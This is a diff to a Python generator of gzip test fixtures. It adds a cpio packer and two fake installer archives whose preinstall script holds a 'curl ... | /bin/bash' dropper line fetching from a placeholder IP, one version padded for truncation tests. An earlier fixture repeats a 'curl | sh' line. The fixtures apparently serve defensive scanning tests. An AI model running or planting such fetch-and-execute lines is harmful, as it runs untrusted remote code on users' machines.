@@ -16,7 +16,7 @@ headers alone can't prove we read what the real tool emits.
 
 Usage: python3 generate.py <output-dir>
 """
-import os, struct, sys, zlib
+import os, random, struct, sys, zlib
 
 FTEXT, FHCRC, FEXTRA, FNAME, FCOMMENT = 1, 2, 4, 8, 16
 
@@ -40,6 +40,14 @@ def gz(data, *, flg=0, extra=b"", name=b"", comment=b"", mtime=0, os_byte=3, xfl
                        len(data) & 0xFFFFFFFF if isize is None else isize)
     return head + body + tail
 
+def odc(name, data=b""):
+    """cpio odc member: 76-byte octal header, name + NUL, data."""
+    nb = name.encode() + b"\x00"
+    h = (b"070707" + b"000000" + b"000001" + b"100755".ljust(6, b"0")[:6] + b"000000" * 2
+         + b"000001" + b"000000" + b"0" * 11
+         + f"{len(nb):06o}".encode() + f"{len(data):011o}".encode())
+    return h + nb + data
+
 def build():
     c = {}
     c["plain"]      = (b"hello, world", gz(b"hello, world"))
@@ -57,6 +65,22 @@ def build():
     # Larger, repetitive: forces multiple deflate blocks under the wrapper.
     big = (b"curl -fsSL https://example.invalid/x | sh\n" * 2000)
     c["multiblock"] = (big, gz(big))
+    # A Scripts-shaped gzip'd cpio whose preinstall is a curl|bash dropper (#75).
+    scripts = (odc("preinstall", b"#!/bin/bash\ncurl -fsSL http://198.51.100.5/s.sh | /bin/bash\n")
+               + odc("TRAILER!!!"))
+    c["scripts_dropper"] = (scripts, gz(scripts))
+    # Same shape, but the dropper line is followed by ~4 KB of varied padding,
+    # so a cut inside the DEFLATE body leaves the dropper decoded and the
+    # member's body short.
+    rng = random.Random(75)
+    words = ["alpha", "bravo", "carrot", "delta", "echo", "fox", "gamma", "hotel", "india", "juliet"]
+    pad = b"".join(
+        (b"# " + " ".join(rng.choice(words) + str(rng.randrange(1000)) for _ in range(6)).encode() + b"\n")
+        for _ in range(100)
+    )
+    long_scripts = (odc("preinstall", b"#!/bin/bash\ncurl -fsSL http://198.51.100.5/s.sh | /bin/bash\n" + pad)
+                    + odc("TRAILER!!!"))
+    c["scripts_dropper_long"] = (long_scripts, gz(long_scripts))
     return c
 
 if __name__ == "__main__":
